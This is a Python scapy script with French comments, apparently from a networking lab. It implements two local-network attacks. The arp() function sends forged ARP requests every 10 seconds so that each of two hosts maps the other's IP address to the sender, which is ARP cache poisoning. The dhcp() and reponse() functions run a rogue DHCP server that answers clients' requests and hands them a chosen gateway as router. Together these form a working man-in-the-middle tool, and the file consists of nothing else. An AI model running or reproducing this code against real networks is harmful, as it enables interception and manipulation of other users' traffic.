from time import sleep
from scapy.all import ARP, Ether, sendp, srp1, BOOTP, IP, sniff, DHCP, UDP
from scapy.interfaces import get_if_list

def arp(ipa, ipb):
    '''Envoyer de requêtes ARP vers les deux adresses ip à chaque 10 secondes'''
    interface = det_iface(ipa)
    info = "..\n[info] Les requêtes vont être envoyer sur " + interface
    info += " à chaque 10 secondes!"
    print(info)

    while True:
        # Requête ARP vers le host ipa
        ipa_req = Ether() / ARP(psrc=ipb, pdst=ipa)
        # Requête ARP vers le host ipb
        ipb_req = Ether() / ARP(psrc=ipa, pdst=ipb)
        
        sendp([ipa_req, ipb_req], iface=interface)
        # Envoyer des requêtes à chaque 10 secondes
        sleep(10)


def det_iface(ip):
    '''Déterminer l'interface à utiliser'''
    req = Ether() / ARP(pdst=ip)
    for timeout in [1,5]:
        for iface in get_if_list():
            response = srp1(req, timeout=timeout, iface=iface)
            try:
                if ARP in response:
                    return iface
            except: pass
    print("..\n[info] On n'a pas réussi à déterminer l'interface.")
    return input("[input] Lequelle utiliser? ")
    

# Variables globales
diffusion = "255.255.255.255"
gw = diffusion
net = ""
mask = '255.255.255.0'
host = [str(i) for i in range(1,15)]

def dhcp(reseau="", routeur="", masque=""):
    '''Répondre à 14 requêtes DHCP en attribuant des adresses ip sur les reseau.
      Le masque doit être inférieure à 255.255.255.240'''
    global gw, net, mask
    if reseau != "":
        net = reseau[:len(reseau)-1]
        gw = routeur if routeur != "" else gw
        mask = masque if masque != "" else mask
    else: print("..\n[erreur] Adresse IP invalide!")

    sniff(
        # Filtrer que les requêtes BOOTP
        lfilter=lambda p: IP in p and p[IP].dst == diffusion and BOOTP in p,
        prn=reponse,
        timeout=600,
        iface=get_if_list()
    )


def reponse(paquet):
    '''Créer les réponses DHCP'''
    pqt = Ether(dst="ff:"*5+"ff") / IP(dst=diffusion) / UDP(sport=67,dport=68)
    req = paquet[BOOTP]
    msg_type = req.getlayer(DHCP).fields['options'][0][1]
    if msg_type == 1:
        # Pour message type Discover
        offre = BOOTP(
                    op = 2,
                    xid = req.xid,
                    yiaddr = net + host[0],
                    chaddr = req.chaddr
                    )
        
        pqt = pqt / offre / dhcp_options(2)
        sendp(pqt, iface=paquet.sniffed_on)

    elif msg_type == 3:    
        # Pour message type Request
        ack = BOOTP(
                    op = 2,
                    xid = req.xid,
                    yiaddr = net + host.pop(0),
                    siaddr = gw,
                    chaddr = req.chaddr
                    )
        
        pqt = pqt / ack / dhcp_options(5)
        sendp(pqt, iface=paquet.sniffed_on)


def dhcp_options(msg_type):
    return  DHCP( options=[ 
                            ('message-type', msg_type),
                            ('server_id',gw),
                            ('router',gw),
                            ('subnet_mask', mask),
                            ('lease_time', 60000),
                            "end"]
            )

